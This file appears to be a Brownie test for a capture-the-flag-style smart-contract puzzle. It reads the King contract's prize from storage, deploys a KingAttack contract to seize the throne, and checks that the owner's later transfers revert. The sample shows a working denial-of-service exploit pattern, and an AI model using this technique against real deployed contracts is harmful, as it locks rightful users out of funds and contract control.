import brownie
from brownie import accounts, King, KingAttack, web3, convert

def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    king = King.deploy({'from': owner, 'amount': '1 ether'})
    assert king._king() == owner
    value = web3.eth.get_storage_at(king.address, 1)
    value = convert.to_uint(value)
    attack = KingAttack.deploy({'from': hacker})
    attack.forward(king.address, {'from': hacker, 'amount': value+1})
    assert king._king() != owner
    with brownie.reverts():
        owner.transfer(to=king.address, amount="2 ether")
    assert king._king() != owner